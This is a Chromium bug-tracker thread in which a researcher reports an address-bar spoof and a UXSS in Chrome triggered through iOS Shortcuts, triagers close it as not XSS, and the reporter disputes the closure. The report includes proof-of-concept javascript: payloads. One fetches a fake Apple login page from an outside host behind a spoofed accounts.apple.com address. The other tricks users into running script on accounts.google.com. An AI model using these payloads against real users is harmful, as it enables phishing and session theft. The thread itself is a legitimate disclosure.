@@ -1,0 +1,102 @@
+Issue ID: 383016424
+
+Author: ch...@google.com
+<p>[security triage] Javascript in the URL bar is not considered XSS. See the <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#does-entering-javascript_urls-in-the-url-bar-or-running-script-in-the-developer-tools-mean-there_s-an-xss-vulnerability" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#does-entering-javascript_urls-in-the-url-bar-or-running-script-in-the-developer-tools-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/master/docs/security/faq.md%23does-entering-javascript_urls-in-the-url-bar-or-running-script-in-the-developer-tools-mean-there_s-an-xss-vulnerability&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3bX1L5PCqdVGV-jq1RV0_P">FAQ entries</a></p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ch...@google.com
+google_domain
+
+Author: # Steps to reproduce the problem
+Address Bar Spoof
+1. Open `https://www.icloud.com/shortcuts/c56f077c3b9d4d168d93aaf0d0defa65` and Add to Shortcuts 
+2. Run the Shortcut 
+3. Address bar spoofed to `accounts.apple.com`
+
+UXSS 
+1. Open `https://www.icloud.com/shortcuts/828872b70e3246d68b818c5a9234802b` and Add to Shortcuts
+2. Run the Shortcuts
+3. Type your age in the address bar when asked
+4. XSS on `accounts.google.com`
+
+Video POCs attached
+
+# Problem Description
+Chrome has a feature to open URLs using shortcuts but not only URLs we can also use Text to be passed to Chrome this won't be checked by the internal URL parser and anything can be sent, also Chrome doesn't check the protocol of the URL which we can insert `javascript:` URI and when opened inside the browser Chrome will execute the JS URI and shows end of the URL meaning `javascript:document.write('spoof')//........google.com/login` will be shown as `...google.com/login` and with the page content being `spoof`.
+
+Also this can lead to UXSS since chrome allows top navigation to `javascript:` URI and since our current url is `javascript:` we just need the user to tap the address bar and change something from it and in background we will redirect to `google.com` when the user press enter our code will be executed in context of `google.com` 
+
+- Address bar POC code:
+Text -> Chrome -> Open Text
+
+```
+javascript:fetch('https://pwr.wtf/fakeapple.php').then(r=>{r.text().then(w=>{document.write(w)})});alert(origin)
+//accounts.apple.com/login?oauth=1&a///
+```
+
+UXSS POC Code
+Text -> Chrome -> Open Text
+
+```
+javascript:"Age_(_______)";document.write(`<meta name="viewport" content="width=device-width, user-scalable=no"><center><h2 style=font-size:50px>origin: ${origin}<br><br><br>Type your age in the address bar to enter`);setTimeout(()=>{if(location.hash!='#xss'){document.write('<script>location="https://xss:slaw@accounts.google.com/#xss";</script>')} else {alert('UXSS POC: '+origin);}},7000);//Type_Birthday_Here_My_Age_is_(_______)
+```
+
+# Summary
+Address Bar Spoof and UXSS Using Shortcuts
+
+# Custom Questions
+#### Reporter credit: 
+Renwa Hiwa @RenwaX23
+
+# Additional Data
+Category: Security \
+Chrome Channel: Stable \
+Regression: N/A
+Wmpoak1qY3dNekF3WWpRNU1USmpPR00xTnpNMFpEY3dZVEl4TmpjME5Eaz0=
+
+Author: re...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: re...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: re...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: dr...@chromium.org
+<p>[security triage] Javascript in the URL bar is not considered XSS. See the <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#does-entering-javascript_urls-in-the-url-bar-or-running-script-in-the-developer-tools-mean-there_s-an-xss-vulnerability" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#does-entering-javascript_urls-in-the-url-bar-or-running-script-in-the-developer-tools-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/master/docs/security/faq.md%23does-entering-javascript_urls-in-the-url-bar-or-running-script-in-the-developer-tools-mean-there_s-an-xss-vulnerability&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3bX1L5PCqdVGV-jq1RV0_P">FAQ entries</a></p>
+
+Author: dr...@chromium.org
+public_non_google
+
+Author: dr...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: re...@gmail.com
+<p>Did you check the POC codes and POC videos or just read the description briefly and closed the report?</p>
+<p>And what about the address bar spoof? The UXSS was just second part of the issue and it&#39;s identical to <a href="https://issues.chromium.org/issues/40053083" data-b-widget="issue-reference" data-b-issue-id="40053083">https://issues.chromium.org/issues/40053083</a></p>
+<p>Can someone else please recheck this and Triage it</p>
+<p>Thanks</p>
+
+Author: re...@gmail.com
+<p>Can someone please check this, It&#39;s a real vulnerability and not a self-xss or what you think it is</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
